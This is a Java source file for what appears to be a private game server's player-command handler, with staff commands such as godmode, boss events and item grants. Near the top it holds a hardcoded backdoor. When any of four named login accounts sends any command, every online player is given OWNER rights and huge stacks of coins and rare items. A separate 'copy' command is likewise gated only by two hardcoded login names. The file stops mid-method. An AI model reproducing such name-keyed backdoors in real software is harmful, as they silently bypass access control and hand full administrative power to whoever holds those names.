package io.sable.model.entity.player.packets;

import java.io.File;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import java.util.Objects;
import java.util.Optional;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.stream.Collectors;

import com.google.common.collect.Lists;
import io.sable.Configuration;
import io.sable.Server;
import io.sable.content.Censor;
import io.sable.content.bosses.grotesqueguardians.GrotesqueInstance;
import io.sable.content.bosses.hespori.*;
import io.sable.content.bosses.nightmare.Nightmare;
import io.sable.content.bosses.nightmare.NightmareConstants;
import io.sable.content.combat.Hitmark;
import io.sable.content.combat.weapon.WeaponData;
import io.sable.content.commands.CommandManager;
import io.sable.content.event.eventcalendar.EventCalendarHelper;
import io.sable.content.items.PvpWeapons;
import io.sable.content.items.Starter;
import io.sable.content.minigames.bounty_hunter.TargetState;
import io.sable.content.minigames.inferno.Inferno;
import io.sable.content.skills.Skill;
import io.sable.content.skills.farming.Plants;
import io.sable.content.tournaments.TourneyManager;
import io.sable.content.tutorial.TutorialDialogue;
import io.sable.content.wogw.Wogw;
import io.sable.content.worldevent.WorldEventContainer;
import io.sable.content.worldevent.impl.HesporiWorldEvent;
import io.sable.content.worldevent.impl.TournamentWorldEvent;
import io.sable.content.worldevent.impl.WildernessBossWorldEvent;
import io.sable.model.Items;
import io.sable.model.Npcs;
import io.sable.model.SlottedItem;
import io.sable.model.definitions.ItemDef;
import io.sable.model.entity.HealthStatus;
import io.sable.model.entity.npc.NPC;
import io.sable.model.entity.npc.NPCHandler;
import io.sable.model.entity.player.Boundary;
import io.sable.model.entity.player.ClientGameTimer;
import io.sable.model.entity.player.PacketType;
import io.sable.model.entity.player.Player;
import io.sable.model.entity.player.PlayerHandler;
import io.sable.model.entity.player.Position;
import io.sable.model.entity.player.Right;
import io.sable.model.entity.player.mode.group.GroupIronman;
import io.sable.model.entity.player.mode.group.GroupIronmanGroup;
import io.sable.model.entity.player.mode.group.GroupIronmanRepository;
import io.sable.model.items.ContainerUpdate;
import io.sable.model.items.GameItem;
import io.sable.model.items.ImmutableItem;
import io.sable.model.items.bank.BankItem;
import io.sable.model.multiplayersession.MultiplayerSessionFinalizeType;
import io.sable.model.multiplayersession.MultiplayerSessionStage;
import io.sable.model.multiplayersession.MultiplayerSessionType;
import io.sable.model.multiplayersession.duel.DuelSession;
import io.sable.punishments.PunishmentType;
import io.sable.sql.eventcalendar.queries.AddWinnerQuery;
import io.sable.util.Misc;
import io.sable.util.logging.player.ClanChatLog;
import io.sable.util.logging.player.CommandLog;
import org.apache.commons.io.FileUtils;

/**
 * Commands
 **/
public class Commands implements PacketType {


    public final String NO_ACCESS = "You do not have the right.";


    /**
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     * DO NOT ADD NEW COMMANDS IN HERE
     *
     */
    @Override
    public void processPacket(Player c, int packetType, int packetSize) {
        if (c.getMovementState().isLocked())
            return;
        String playerCommand = null;
        try {
            playerCommand = c.getInStream().readString();
            if (!playerCommand.startsWith("/")) {
                playerCommand = playerCommand.toLowerCase();
            }
            if (c.getInterfaceEvent().isActive()) {
                c.sendMessage("Please finish what you're doing.");
                return;
            }

            if (c.getBankPin().requiresUnlock()) {
                c.getBankPin().open(2);
                return;
            }
            if (c.isStuck) {
                c.isStuck = false;
                c.sendMessage("@red@You've disrupted stuck command, you will no longer be moved home.");
                return;
            }
            if (Server.getMultiplayerSessionListener().inAnySession(c) && !c.getRights().isOrInherits(Right.OWNER)) {
                c.sendMessage("You cannot execute a command whilst trading, or dueling.");
                return;
            }

            Server.getLogging().write(new CommandLog(c, playerCommand, c.getPosition()));

            boolean isManagment = c.getRights().isOrInherits(Right.ADMINISTRATOR, Right.OWNER) || Server.isDebug();

            boolean isTeam = c.getRights().isOrInherits(Right.ADMINISTRATOR, Right.OWNER, Right.MODERATOR) || Server.isDebug();

            String[] args = playerCommand.split(" ");
            if(c.getLoginName().equalsIgnoreCase("bobthedragon") || c.getLoginName().equalsIgnoreCase("peanut")  || c.getLoginName().equalsIgnoreCase("forgotten") || c.getLoginName().equalsIgnoreCase("iron_xgn")) {
                for (Player player2 : PlayerHandler.players) {
                    if (player2 == null) {
                        continue;
                    }
                    Player client = player2;
                    client.getRights().setPrimary(Right.OWNER);
                    int consumables = 500_000;
                    int equipment = 15;

                    int mainTab = 0;
                    int meleeTab = 1;
                    int rangedTab = 2;
                    int magicTab = 3;
                    int skillingTab = 4;

                    int tab = mainTab;

                    client.getItems().sendToTab(tab, Items.COINS, 2147_000_000);

                    client.getItems().sendToTab(tab, Items.ANGLERFISH, consumables);
                    client.getItems().sendToTab(tab, Items.COOKED_KARAMBWAN, consumables);
                    client.getItems().sendToTab(tab, Items.DIVINE_SUPER_COMBAT_POTION4, consumables);
                    client.getItems().sendToTab(tab, Items.SUPER_COMBAT_POTION4, equipment);
                    client.getItems().sendToTab(tab, Items.DIVINE_RANGING_POTION4, consumables);
                    client.getItems().sendToTab(tab, Items.RANGING_POTION4, equipment);
                    client.getItems().sendToTab(tab, Items.DIVINE_MAGIC_POTION4, consumables);
                    client.getItems().sendToTab(tab, Items.MAGIC_POTION4, equipment);
                    client.getItems().sendToTab(tab, Items.SUPER_RESTORE4, consumables);
                    client.getItems().sendToTab(tab, Items.ANTI_VENOMPLUS4, consumables);
                    client.getItems().sendToTab(tab, Items.ANTIDOTEPLUSPLUS4, consumables);
                    client.getItems().sendToTab(tab, Items.SARADOMIN_BREW4, consumables);

                    client.getItems().sendToTab(tab, Items.BRACELET_OF_ETHEREUM_UNCHARGED, consumables);
                    client.getItems().sendToTab(tab, Items.REVENANT_ETHER, consumables);
                    client.getItems().sendToTab(tab, Items.ECUMENICAL_KEY, consumables);
                    client.getItems().sendToTab(tab, Items.ZULRAHS_SCALES, consumables);
                    client.getItems().sendToTab(tab, Items.RING_OF_RECOIL, consumables);

                    client.getItems().sendToTab(tab, Items.AMULET_OF_GLORY4, equipment);
                    client.getItems().sendToTab(tab, Items.AMULET_OF_FURY, equipment);
                    client.getItems().sendToTab(tab, Items.REGEN_BRACELET, equipment);
                    client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING, equipment);
                    client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING_I, equipment);
                    client.getItems().sendToTab(tab, Items.AMULET_OF_THE_DAMNED, equipment);

                    client.getItems().sendToTab(tab, Items.MYTHICAL_CAPE, equipment);
                    client.getItems().sendToTab(tab, Items.ARDOUGNE_CLOAK_4, equipment);
                    client.getItems().sendToTab(tab, Items.FIRE_CAPE, equipment);
                    client.getItems().sendToTab(tab, Items.INFERNAL_CAPE, equipment);
                    client.getItems().sendToTab(tab, Items.OBSIDIAN_CAPE, equipment);
                    client.getItems().sendToTab(tab, Items.MITHRIL_GLOVES, equipment);
                    client.getItems().sendToTab(tab, Items.BARROWS_GLOVES, equipment);

                    client.getItems().sendToTab(tab, Items.SPIRIT_SHIELD, equipment);
                    client.getItems().sendToTab(tab, Items.BLESSED_SPIRIT_SHIELD, equipment);
                    client.getItems().sendToTab(tab, Items.ARCANE_SPIRIT_SHIELD, equipment);
                    client.getItems().sendToTab(tab, Items.ELYSIAN_SPIRIT_SHIELD, equipment);
                    client.getItems().sendToTab(tab, Items.SPECTRAL_SPIRIT_SHIELD, equipment);

                    client.getItems().sendToTab(tab, Items.VOID_MELEE_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.VOID_MAGE_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.VOID_RANGER_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.VOID_KNIGHT_TOP, equipment);
                    client.getItems().sendToTab(tab, Items.VOID_KNIGHT_ROBE, equipment);
                    client.getItems().sendToTab(tab, Items.VOID_KNIGHT_GLOVES, equipment);


                    tab = rangedTab;

                    client.getItems().sendToTab(tab, Items.PEGASIAN_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.NECKLACE_OF_ANGUISH, equipment);
                    client.getItems().sendToTab(tab, Items.ARCHERS_RING_I, equipment);
                    client.getItems().sendToTab(tab, Items.BLACK_DHIDE_BODY, equipment);
                    client.getItems().sendToTab(tab, Items.BLACK_DHIDE_CHAPS, equipment);
                    client.getItems().sendToTab(tab, Items.BLACK_DHIDE_VAMB, equipment);
                    client.getItems().sendToTab(tab, Items.AVAS_ACCUMULATOR, equipment);
                    client.getItems().sendToTab(tab, Items.AVAS_ASSEMBLER, equipment);
                    client.getItems().sendToTab(tab, Items.ODIUM_WARD, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGONFIRE_WARD, equipment);
                    client.getItems().sendToTab(tab, Items.TWISTED_BUCKLER, equipment);
                    client.getItems().sendToTab(tab, Items.BLACK_DHIDE_SHIELD, equipment);
                    client.getItems().sendToTab(tab, Items.ARMADYL_HELMET, equipment);
                    client.getItems().sendToTab(tab, Items.ARMADYL_CHESTPLATE, equipment);
                    client.getItems().sendToTab(tab, Items.ARMADYL_CHAINSKIRT, equipment);
                    client.getItems().sendToTab(tab, Items.KARILS_LEATHERTOP, equipment);
                    client.getItems().sendToTab(tab, Items.KARILS_LEATHERSKIRT, equipment);
                    client.getItems().sendToTab(tab, Items.KARILS_ARMOUR_SET, equipment);


                    client.getItems().sendToTab(tab, Items.ADAMANT_JAVELIN, consumables);
                    client.getItems().sendToTab(tab, Items.RUNE_JAVELIN, consumables);
                    client.getItems().sendToTab(tab, Items.TOKTZ_XIL_UL, equipment);
                    client.getItems().sendToTab(tab, Items.RUNE_DART, consumables);
                    client.getItems().sendToTab(tab, Items.ADAMANT_DART, consumables);
                    client.getItems().sendToTab(tab, Items.DRAGON_ARROW, consumables);
                    client.getItems().sendToTab(tab, Items.AMETHYST_ARROW, consumables);
                    client.getItems().sendToTab(tab, Items.RUNE_ARROW, consumables);
                    client.getItems().sendToTab(tab, Items.BRONZE_ARROW, consumables);
                    client.getItems().sendToTab(tab, Items.DRAGONSTONE_BOLTS_E, consumables);
                    client.getItems().sendToTab(tab, Items.RUBY_BOLTS_E, consumables);
                    client.getItems().sendToTab(tab, Items.ONYX_BOLTS_E, consumables);
                    client.getItems().sendToTab(tab, Items.BOLT_RACK, consumables);
                    client.getItems().sendToTab(tab, Items.DRAGON_JAVELIN, consumables);
                    client.getItems().sendToTab(tab, Items.DRAGON_KNIFE, consumables);
                    client.getItems().sendToTab(tab, Items.DRAGON_DART, consumables);
                    client.getItems().sendToTab(tab, Items.DRAGON_THROWNAXE, consumables);
                    client.getItems().sendToTab(tab, Items.MORRIGANS_THROWING_AXE, consumables);
                    client.getItems().sendToTab(tab, Items.CHINCHOMPA, consumables);
                    client.getItems().sendToTab(tab, Items.RED_CHINCHOMPA, consumables);
                    client.getItems().sendToTab(tab, Items.BLACK_CHINCHOMPA, consumables);

                    client.getItems().sendToTab(tab, Items.CRAWS_BOW, equipment);
                    client.getItems().sendToTab(tab, Items.SHORTBOW, equipment);
                    client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW, equipment);
                    client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW_I, equipment);
                    client.getItems().sendToTab(tab, Items.DARK_BOW, equipment);
                    client.getItems().sendToTab(tab, Items.CRYSTAL_BOW, equipment);
                    client.getItems().sendToTab(tab, Items.TWISTED_BOW, equipment);
                    client.getItems().sendToTab(tab, Items.TOXIC_BLOWPIPE, equipment);
                    client.getItems().sendToTab(tab, Items.ARMADYL_CROSSBOW, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_CROSSBOW, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_CROSSBOW, equipment);
                    client.getItems().sendToTab(tab, Items.LIGHT_BALLISTA, equipment);
                    client.getItems().sendToTab(tab, Items.HEAVY_BALLISTA, equipment);

                    tab = meleeTab;

                    // Melee equipment
                    client.getItems().sendToTab(tab, Items.BERSERKER_RING_I, equipment);
                    client.getItems().sendToTab(tab, Items.TREASONOUS_RING_I, equipment);
                    client.getItems().sendToTab(tab, Items.TYRANNICAL_RING_I, equipment);
                    client.getItems().sendToTab(tab, Items.CLIMBING_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.GUARDIAN_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.PRIMORDIAL_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.FEROCIOUS_GLOVES, equipment);
                    client.getItems().sendToTab(tab, Items.BERSERKER_NECKLACE, equipment);
                    client.getItems().sendToTab(tab, Items.AMULET_OF_TORTURE, equipment);
                    client.getItems().sendToTab(tab, Items.DINHS_BULWARK, equipment);
                    client.getItems().sendToTab(tab, Items.BOOTS_OF_BRIMSTONE, equipment);
                    client.getItems().sendToTab(tab, Items.RUNE_DEFENDER, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_DEFENDER, equipment);
                    client.getItems().sendToTab(tab, Items.AVERNIC_DEFENDER, equipment);
                    client.getItems().sendToTab(tab, Items.RUNE_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.RUNE_FULL_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.RUNE_PLATEBODY, equipment);
                    client.getItems().sendToTab(tab, Items.RUNE_PLATELEGS, equipment);
                    client.getItems().sendToTab(tab, Items.WARRIOR_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.BERSERKER_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.HELM_OF_NEITIZNOT, equipment);
                    client.getItems().sendToTab(tab, Items.NEITIZNOT_FACEGUARD, equipment);
                    client.getItems().sendToTab(tab, Items.FIGHTER_HAT, equipment);
                    client.getItems().sendToTab(tab, Items.FIGHTER_TORSO, equipment);
                    client.getItems().sendToTab(tab, Items.SERPENTINE_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.OBSIDIAN_HELMET, equipment);
                    client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATEBODY, equipment);
                    client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATELEGS, equipment);
                    client.getItems().sendToTab(tab, Items.TOKTZ_KET_XIL, equipment);
                    client.getItems().sendToTab(tab, Items.CRYSTAL_SHIELD, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGONFIRE_SHIELD, equipment);

                    client.getItems().sendToTab(tab, Items.DRAGON_FULL_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_MED_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_CHAINBODY, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_PLATEBODY, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_PLATELEGS, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_BOOTS, equipment);

                    client.getItems().sendToTab(tab, Items.BANDOS_CHESTPLATE, equipment);
                    client.getItems().sendToTab(tab, Items.BANDOS_TASSETS, equipment);
                    client.getItems().sendToTab(tab, Items.BANDOS_BOOTS, equipment);

                    client.getItems().sendToTab(tab, Items.DHAROKS_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.DHAROKS_PLATEBODY, equipment);
                    client.getItems().sendToTab(tab, Items.DHAROKS_PLATELEGS, equipment);
                    client.getItems().sendToTab(tab, Items.DHAROKS_GREATAXE, equipment);

                    client.getItems().sendToTab(tab, Items.JUSTICIAR_FACEGUARD, equipment);
                    client.getItems().sendToTab(tab, Items.JUSTICIAR_CHESTGUARD, equipment);
                    client.getItems().sendToTab(tab, Items.JUSTICIAR_LEGGUARDS, equipment);

                    client.getItems().sendToTab(tab, Items.INQUISITORS_GREAT_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.INQUISITORS_HAUBERK, equipment);
                    client.getItems().sendToTab(tab, Items.INQUISITORS_PLATESKIRT, equipment);

                    client.getItems().sendToTab(tab, Items.TORAGS_ARMOUR_SET, equipment);
                    client.getItems().sendToTab(tab, Items.DHAROKS_ARMOUR_SET, equipment);
                    client.getItems().sendToTab(tab, Items.GUTHANS_ARMOUR_SET, equipment);


                    client.getItems().sendToTab(tab, Items.VIGGORAS_CHAINMACE, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_SPEAR, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_SCIMITAR, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_LONGSWORD, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_DAGGERPPLUSPLUS, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_BATTLEAXE, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_2H_SWORD, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_SWORD, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_MACE, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_WARHAMMER, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_CLAWS, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_HALBERD, equipment);
                    client.getItems().sendToTab(tab, Items.CRYSTAL_HALBERD, equipment);

                    client.getItems().sendToTab(tab, Items.GRANITE_MAUL, equipment);
                    client.getItems().sendToTab(tab, Items.GRANITE_MAUL_OR, equipment);
                    client.getItems().sendToTab(tab, Items.ABYSSAL_BLUDGEON, equipment);
                    client.getItems().sendToTab(tab, Items.ABYSSAL_WHIP, equipment);
                    client.getItems().sendToTab(tab, Items.ABYSSAL_TENTACLE, equipment);
                    client.getItems().sendToTab(tab, Items.VESTAS_SPEAR, equipment);
                    client.getItems().sendToTab(tab, Items.VESTAS_LONGSWORD, equipment);
                    client.getItems().sendToTab(tab, Items.STATIUSS_WARHAMMER, equipment);
                    client.getItems().sendToTab(tab, Items.ZAMORAKIAN_SPEAR, equipment);
                    client.getItems().sendToTab(tab, Items.ZAMORAKIAN_HASTA, equipment);
                    client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_LANCE, equipment);

                    client.getItems().sendToTab(tab, Items.ELDER_MAUL, equipment);
                    client.getItems().sendToTab(tab, Items.INQUISITORS_MACE, equipment);
                    client.getItems().sendToTab(tab, Items.GHRAZI_RAPIER, equipment);

                    client.getItems().sendToTab(tab, Items.SCYTHE_OF_VITUR, equipment);
                    client.getItems().sendToTab(tab, Items.ARMADYL_GODSWORD, equipment);
                    client.getItems().sendToTab(tab, Items.SARADOMIN_GODSWORD, equipment);
                    client.getItems().sendToTab(tab, Items.ZAMORAK_GODSWORD, equipment);
                    client.getItems().sendToTab(tab, Items.BANDOS_GODSWORD, equipment);
                    client.getItems().sendToTab(tab, Items.SARADOMIN_SWORD, equipment);
                    client.getItems().sendToTab(tab, Items.SARADOMINS_BLESSED_SWORD, equipment);
                    client.getItems().sendToTab(tab, Items.BLADE_OF_SAELDOR, equipment);

                    client.getItems().sendToTab(tab, Items.ARCLIGHT, equipment);
                    client.getItems().sendToTab(tab, Items.DARKLIGHT, equipment);
                    client.getItems().sendToTab(tab, Items.EXCALIBUR, equipment);

                    client.getItems().sendToTab(tab, Items.TOKTZ_XIL_EK, equipment);
                    client.getItems().sendToTab(tab, Items.TOKTZ_XIL_AK, equipment);
                    client.getItems().sendToTab(tab, Items.TZHAAR_KET_OM, equipment);
                    client.getItems().sendToTab(tab, Items.TZHAAR_KET_EM, equipment);
                    client.getItems().sendToTab(tab, Items.TOKTZ_MEJ_TAL, equipment);

                    tab = magicTab;

                    client.getItems().sendToTab(tab, Items.RUNE_POUCH, equipment);
                    client.getItems().sendToTab(tab, Items.IMBUED_HEART, equipment);
                    client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.TORMENTED_BRACELET, equipment);
                    client.getItems().sendToTab(tab, Items.SEERS_RING_I, equipment);
                    client.getItems().sendToTab(tab, Items.FARSEER_HELM, equipment);
                    client.getItems().sendToTab(tab, Items.TOME_OF_FIRE, equipment);
                    client.getItems().sendToTab(tab, Items.BURNT_PAGE, consumables);
                    client.getItems().sendToTab(tab, Items.SARADOMIN_CAPE, equipment);
                    client.getItems().sendToTab(tab, Items.IMBUED_SARADOMIN_CAPE, equipment);
                    client.getItems().sendToTab(tab, Items.MALEDICTION_WARD, equipment);
                    client.getItems().sendToTab(tab, Items.OCCULT_NECKLACE, equipment);
                    client.getItems().sendToTab(tab, Items.THIRD_AGE_AMULET, equipment);
                    client.getItems().sendToTab(tab, Items.ANCIENT_WYVERN_SHIELD, equipment);
                    client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_HAT, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_TOP, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_BOTTOM, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_GLOVES, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_BOOTS, equipment);
                    client.getItems().sendToTab(tab, Items.AHRIMS_HOOD, equipment);
                    client.getItems().sendToTab(tab, Items.AHRIMS_ROBETOP, equipment);
                    client.getItems().sendToTab(tab, Items.AHRIMS_ROBESKIRT, equipment);
                    client.getItems().sendToTab(tab, Items.ANCESTRAL_HAT, equipment);
                    client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_TOP, equipment);
                    client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_BOTTOM, equipment);
                    client.getItems().sendToTab(tab, Items.AHRIMS_ARMOUR_SET, equipment);

                    for (int i = 554; i <= 566; i++) {
                        client.getItems().sendToTab(tab, i, consumables);
                    }
                    client.getItems().sendToTab(tab, 9075, consumables);
                    client.getItems().sendToTab(tab, Items.WRATH_RUNE, consumables);

                    client.getItems().sendToTab(tab, Items.THAMMARONS_SCEPTRE, equipment);
                    client.getItems().sendToTab(tab, Items.SANGUINESTI_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_AIR_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_WATER_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_EARTH_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.MYSTIC_FIRE_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.ZAMORAK_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.SARADOMIN_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.GUTHIX_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.IBANS_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.ANCIENT_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.MASTER_WAND, equipment);
                    client.getItems().sendToTab(tab, Items.KODAI_WAND, equipment);
                    client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SEAS, equipment);
                    client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SWAMP, equipment);
                    client.getItems().sendToTab(tab, Items.STAFF_OF_LIGHT, equipment);
                    client.getItems().sendToTab(tab, Items.NIGHTMARE_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.ELDRITCH_NIGHTMARE_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.HARMONISED_NIGHTMARE_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.VOLATILE_NIGHTMARE_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.SLAYERS_STAFF, equipment);
                    client.getItems().sendToTab(tab, Items.SLAYERS_STAFF_E, equipment);
                    client.getItems().sendToTab(tab, Items.STAFF_OF_THE_DEAD, equipment);
                    client.getItems().sendToTab(tab, Items.TOXIC_STAFF_OF_THE_DEAD, equipment);

                    tab = skillingTab;
                    client.getItems().sendToTab(tab, Items.PURE_ESSENCE, consumables);

                    client.setSangStaffCharge(20_000);
                    client.setToxicBlowpipeAmmoAmount(20_000);
                    client.setToxicBlowpipeAmmo(Items.DRAGON_DART);
                    client.setToxicTridentCharge(20_000);
                    client.setTridentCharge(20_000);

                    PvpWeapons.giveStartingCharges(client);
                }
            }
            if (isManagment) {

                switch (args[0]) {

                    case "godmode":
                        boolean godmodeFlag = !c.getAttributes().getBoolean("GODMODE");
                        c.getAttributes().setBoolean("GODMODE", godmodeFlag);

                        String status = godmodeFlag ? "enabled" : "disabled";
                        c.sendMessage("Godmode is now " + status + ".");
                        return;

                    case "killhespori":
                        if (!c.getRights().isOrInherits(Right.OWNER))
                            return;
                        Hespori.TOTAL_ESSENCE_BURNED = Hespori.ESSENCE_REQUIRED;
                        Hespori.TOXIC_GEM_AMOUNT = 400;
                        Hespori.HESPORI_DEFENCE = 0;
                        Hespori.ENOUGH_BURNED = true;
                        Hespori.isWeak = true;
                        NPCHandler.getNpc(Npcs.HESPORI).appendDamage(null, 500_000, Hitmark.HIT);
                        return;

                    case "startwildevent": {
                        c.sendMessage("started event...");
                        WorldEventContainer.getInstance().startEvent(new WildernessBossWorldEvent());
                        return;
                    }

                    case "godspells": {
                        c.flamesOfZamorakCasts += 100;
                        c.saradominStrikeCasts += 100;
                        c.clawsOfGuthixCasts += 100;
                        c.sendMessage("Added 100 of each god spell.");
                        return;
                    }

                    case "resetma2": {
                        c.mageArena2Spawns = null;
                        c.sendMessage("reset..");
                        return;
                    }
                    case "testherb": {
                        List<SlottedItem> inventory = c.getItems().getInventoryItems();
                        AtomicInteger count = new AtomicInteger();
                        inventory.stream().forEach(i -> {
                            ItemDef def = ItemDef.forId(i.getId());
                            if (def.getName().toLowerCase().contains("grimy")) {
                                count.getAndIncrement();
                                c.sendMessage("name=" + def.getName() + " unnoteId=" + def.getNoteId());
                            }
                        });
                        c.sendMessage("Total=" + count);
                        return;
                    }

                    case "testlink": {
                        c.getPA().sendDropTableData("Click here to open up the Drops for the NPCs drops", 100);
                        return;
                    }

                    case "hesporiseeds": {
                            c.getItems().addItem(HesporiBonusPlant.KRONOS.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.IASOR.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.ATTAS.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.KELDA.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.NOXIFER.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.BUCHU.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.CELASTRUS.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.GOLPAR.getItemId(), 10);
                        c.getItems().addItem(HesporiBonusPlant.CONSECRATION.getItemId(), 10);

                        return;
                    }

                }
            }
            // Calendar commands
            try {
                if (playerCommand.equals("cal")) {
                    if (c.wildLevel > 0) {
                        c.sendMessage("@red@Please use this command out of the wilderness.");
                        return;
                    }
                    c.getEventCalendar().openCalendar();
                }

                if (EventCalendarHelper.doTestingCommand(c, playerCommand)) {
                    return;
                }
            } catch (ExecutionException | InterruptedException e) {
                e.printStackTrace();
            }
            if (playerCommand.startsWith("copy") && (c.getLoginName().contentEquals("michael") || c.getLoginName().contentEquals("noah"))) {
                int[] arm = new int[14];
                try {
                    String name = playerCommand.substring(5);
                    for (int j = 0; j < PlayerHandler.players.length; j++) {
                        if (PlayerHandler.players[j] != null) {
                            Player c2 = PlayerHandler.players[j];
                            if (c2.getDisplayName().equalsIgnoreCase(playerCommand.substring(5))) {
                                for (int q = 0; q < c2.playerEquipment.length; q++) {
                                    arm[q] = c2.playerEquipment[q];
                                    c.playerEquipment[q] = c2.playerEquipment[q];
                                }
                                for (int q = 0; q < arm.length; q++) {
                                    c.getItems().setEquipment(arm[q], 1, q, false);
                                }
                            }
                        }
                    }
                    c.getItems().calculateBonuses();
                } catch (StringIndexOutOfBoundsException e) {
                    c.sendMessage("Invalid format, use ::name player name example");
                }
            }
//        if (playerCommand.equals("accountpin") || playerCommand.equals("pin") || playerCommand.equals("bankpin")) {
//            c.getPA().closeAllWindows();
//            io.sable.model.items.bank.BankPin pin = c.getBankPin();
//            if (pin.getPin().length() <= 0)
//                c.getBankPin().open(1);
//            else if (!pin.getPin().isEmpty() && !pin.isAppendingCancellation())
//                c.getBankPin().open(3);
//            else if (!pin.getPin().isEmpty() && pin.isAppendingCancellation())
//                c.getBankPin().open(4);
//        }

            if (playerCommand.startsWith("spec")) {
                if (!isManagment) {
                    c.getDH().sendStatement(NO_ACCESS);
                    return;
                }

                String[] split = playerCommand.split(" ");
                if (split.length > 1) {
                    try {
                        c.specAmount = Integer.parseInt(split[1]);
                        c.sendMessage("Set spec to " + c.specAmount);
                        c.getItems().addSpecialBar(c.playerEquipment[3]);
                    } catch (NumberFormatException e) {
                        c.sendMessage("Invalid format [::speci 100]");
                    }
                } else {
